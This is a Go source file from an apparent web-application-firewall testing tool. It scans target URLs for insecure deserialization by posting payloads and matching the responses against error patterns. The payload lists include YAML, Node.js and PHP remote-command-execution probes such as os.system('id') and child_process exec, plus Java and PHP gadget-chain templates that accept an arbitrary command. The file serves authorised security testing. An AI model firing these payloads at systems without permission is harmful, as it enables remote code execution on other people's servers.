// Package insecuredeser provides Insecure Deserialization testing
package insecuredeser

import (
	"context"
	"encoding/base64"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/waftester/waftester/pkg/iohelper"
)

// Config configures insecure deserialization testing
type Config struct {
	Concurrency int
	Timeout     time.Duration
	Headers     map[string]string
	OOBDomain   string
}

// DefaultConfig returns sensible defaults
func DefaultConfig() Config {
	return Config{
		Concurrency: 5,
		Timeout:     15 * time.Second,
	}
}

// Result represents an insecure deserialization test result
type Result struct {
	URL          string
	Parameter    string
	Payload      string
	PayloadType  string
	StatusCode   int
	ResponseSize int
	Vulnerable   bool
	Evidence     string
	Severity     string
	Timestamp    time.Time
}

// Scanner performs insecure deserialization testing
type Scanner struct {
	config  Config
	client  *http.Client
	results []Result
	mu      sync.RWMutex
}

// NewScanner creates a new insecure deserialization scanner
func NewScanner(config Config) *Scanner {
	if config.Concurrency <= 0 {
		config.Concurrency = 5
	}
	if config.Timeout <= 0 {
		config.Timeout = 15 * time.Second
	}

	return &Scanner{
		config: config,
		client: &http.Client{
			Timeout: config.Timeout,
		},
		results: make([]Result, 0),
	}
}

// Scan tests a URL for insecure deserialization
func (s *Scanner) Scan(ctx context.Context, targetURL string, params map[string]string) ([]Result, error) {
	results := make([]Result, 0)

	for param := range params {
		for _, payload := range Payloads() {
			testParams := make(map[string]string)
			for k, v := range params {
				testParams[k] = v
			}
			testParams[param] = payload.Value

			result := s.testPayload(ctx, targetURL, param, payload, testParams)
			if result.Vulnerable {
				results = append(results, result)
			}
		}
	}

	s.mu.Lock()
	s.results = append(s.results, results...)
	s.mu.Unlock()

	return results, nil
}

// Payload represents a deserialization payload
type Payload struct {
	Value    string
	Type     string
	Language string
	Markers  []string
}

// testPayload tests a single deserialization payload
func (s *Scanner) testPayload(ctx context.Context, targetURL, param string, payload Payload, params map[string]string) Result {
	result := Result{
		URL:         targetURL,
		Parameter:   param,
		Payload:     payload.Value,
		PayloadType: payload.Type,
		Timestamp:   time.Now(),
	}

	req, err := http.NewRequestWithContext(ctx, "POST", targetURL, strings.NewReader(buildFormData(params)))
	if err != nil {
		return result
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	for k, v := range s.config.Headers {
		req.Header.Set(k, v)
	}

	resp, err := s.client.Do(req)
	if err != nil {
		return result
	}
	defer resp.Body.Close()

	body, _ := iohelper.ReadBodyDefault(resp.Body)
	result.StatusCode = resp.StatusCode
	result.ResponseSize = len(body)

	result.Vulnerable, result.Evidence = s.detectVulnerability(string(body), payload.Markers)
	if result.Vulnerable {
		result.Severity = "CRITICAL"
	}

	return result
}

func buildFormData(params map[string]string) string {
	parts := make([]string, 0, len(params))
	for k, v := range params {
		parts = append(parts, k+"="+v)
	}
	return strings.Join(parts, "&")
}

// detectVulnerability checks response for deserialization indicators
func (s *Scanner) detectVulnerability(body string, markers []string) (bool, string) {
	for _, marker := range markers {
		if strings.Contains(body, marker) {
			return true, "Deserialization marker: " + marker
		}
	}

	// Error patterns indicating deserialization issues
	patterns := []string{
		"unserialize",
		"ObjectInputStream",
		"pickle.loads",
		"yaml.load",
		"Marshal.load",
		"readObject",
		"ClassNotFoundException",
		"InvalidClassException",
		"StreamCorruptedException",
		"__wakeup",
		"__destruct",
	}

	bodyLower := strings.ToLower(body)
	for _, pattern := range patterns {
		if strings.Contains(bodyLower, strings.ToLower(pattern)) {
			return true, "Deserialization error: " + pattern
		}
	}

	return false, ""
}

// GetResults returns all results
func (s *Scanner) GetResults() []Result {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return append([]Result{}, s.results...)
}

// Payloads returns insecure deserialization payloads
func Payloads() []Payload {
	return []Payload{
		// PHP
		{Value: `O:8:"stdClass":0:{}`, Type: "php", Language: "PHP", Markers: []string{}},
		{Value: `a:1:{i:0;O:8:"stdClass":0:{}}`, Type: "php-array", Language: "PHP", Markers: []string{}},

		// Java (ysoserial patterns)
		{Value: base64.StdEncoding.EncodeToString([]byte("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA")), Type: "java-base64", Language: "Java", Markers: []string{}},
		{Value: "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA", Type: "java-serial", Language: "Java", Markers: []string{}},

		// Python pickle
		{Value: "gASVIAAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwGcHJpbnQolC4=", Type: "python-pickle", Language: "Python", Markers: []string{}},

		// Ruby Marshal
		{Value: "\x04\x08{\x00", Type: "ruby-marshal", Language: "Ruby", Markers: []string{}},

		// .NET
		{Value: "AAEAAAD/////AQAAAAAAAAAPAQAAAA", Type: "dotnet", Language: ".NET", Markers: []string{}},

		// YAML (PyYAML)
		{Value: "!!python/object/apply:os.system ['id']", Type: "yaml", Language: "Python", Markers: []string{"uid="}},
		{Value: "!!python/object/new:subprocess.check_output [['id']]", Type: "yaml", Language: "Python", Markers: []string{}},

		// Node.js
		{Value: `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}`, Type: "nodejs", Language: "Node.js", Markers: []string{}},
	}
}

// JavaGadgetPayloads returns Java gadget chain payloads
func JavaGadgetPayloads(command string) []Payload {
	return []Payload{
		{Value: "CommonsCollections1:" + command, Type: "ysoserial", Language: "Java", Markers: nil},
		{Value: "CommonsCollections2:" + command, Type: "ysoserial", Language: "Java", Markers: nil},
		{Value: "CommonsCollections3:" + command, Type: "ysoserial", Language: "Java", Markers: nil},
		{Value: "CommonsCollections4:" + command, Type: "ysoserial", Language: "Java", Markers: nil},
		{Value: "CommonsCollections5:" + command, Type: "ysoserial", Language: "Java", Markers: nil},
		{Value: "CommonsCollections6:" + command, Type: "ysoserial", Language: "Java", Markers: nil},
		{Value: "CommonsCollections7:" + command, Type: "ysoserial", Language: "Java", Markers: nil},
		{Value: "Jdk7u21:" + command, Type: "ysoserial", Language: "Java", Markers: nil},
		{Value: "Spring1:" + command, Type: "ysoserial", Language: "Java", Markers: nil},
	}
}

// PHPGadgetPayloads returns PHP gadget chain payloads
func PHPGadgetPayloads(command string) []Payload {
	return []Payload{
		{Value: `O:40:"Illuminate\Broadcasting\PendingBroadcast":1:{s:9:"*events";O:25:"Illuminate\Bus\Dispatcher":1:{s:16:"*queueResolver";s:` + strconv.Itoa(len(command)) + `:"` + command + `";}}`, Type: "phpggc", Language: "PHP", Markers: nil},
	}
}
